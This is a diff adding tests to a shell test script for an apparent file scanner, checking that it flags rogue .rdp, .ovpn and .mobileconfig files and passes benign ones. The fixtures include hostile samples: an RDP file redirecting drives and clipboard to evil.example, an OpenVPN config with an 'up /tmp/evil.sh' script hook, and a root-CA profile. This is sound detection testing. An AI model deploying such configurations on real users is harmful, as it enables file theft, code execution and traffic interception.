@@ -7860,6 +7860,40 @@ printf 'module example.com/y\n\ngo 1.21\n\nrequire example.com/lib v1.0.0\n' \
     || check "manifest: plain go.mod clean" "0" "1"
 rm -rf "$PDIR"
 
+# ─── F36–F38: remote-access carriers (.rdp/.ovpn/.mobileconfig) ────────
+RDIR=$(mktemp -d)
+printf 'full address:s:evil.example\ndrivestoredirect:s:C:\\\nredirectclipboard:i:1\n' \
+    > "$RDIR/rogue.rdp"
+./hlse_core file "$RDIR/rogue.rdp" 2>&1 | grep -q "RDP REDIRECT" \
+    && check "file: rdp drive/clipboard redirect flagged" "0" "0" \
+    || check "file: rdp drive/clipboard redirect flagged" "0" "1"
+printf 'full address:s:vpn.corp.example\nauthentication level:i:2\n' \
+    > "$RDIR/ok.rdp"
+./hlse_core file "$RDIR/ok.rdp" 2>&1 | grep -q "RDP REDIRECT" \
+    && check "file: plain rdp no redirect reason" "0" "1" \
+    || check "file: plain rdp no redirect reason" "0" "0"
+printf 'client\ndev tun\nremote evil.example 1194\nup /tmp/evil.sh\nscript-security 2\n' \
+    > "$RDIR/evil.ovpn"
+./hlse_core file "$RDIR/evil.ovpn" 2>&1 | grep -q "OVPN HOOK" \
+    && check "file: ovpn up-script hook flagged" "0" "0" \
+    || check "file: ovpn up-script hook flagged" "0" "1"
+printf 'client\ndev tun\nremote vpn.corp.example 1194\ncomp-lzo\n' \
+    > "$RDIR/ok.ovpn"
+./hlse_core file "$RDIR/ok.ovpn" 2>&1 | grep -q "OK" \
+    && check "file: plain ovpn clean" "0" "0" \
+    || check "file: plain ovpn clean" "0" "1"
+printf '<?xml version="1.0"?>\n<plist><dict><key>PayloadType</key><string>com.apple.security.root</string></dict></plist>\n' \
+    > "$RDIR/rogue.mobileconfig"
+./hlse_core file "$RDIR/rogue.mobileconfig" 2>&1 | grep -q "MOBILECONFIG" \
+    && check "file: mobileconfig root-CA flagged" "0" "0" \
+    || check "file: mobileconfig root-CA flagged" "0" "1"
+printf '<?xml version="1.0"?>\n<plist><dict><key>PayloadType</key><string>com.apple.wifi.managed</string></dict></plist>\n' \
+    > "$RDIR/ok.mobileconfig"
+./hlse_core file "$RDIR/ok.mobileconfig" 2>&1 | grep -q "OK" \
+    && check "file: wifi mobileconfig clean" "0" "0" \
+    || check "file: wifi mobileconfig clean" "0" "1"
+rm -rf "$RDIR"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
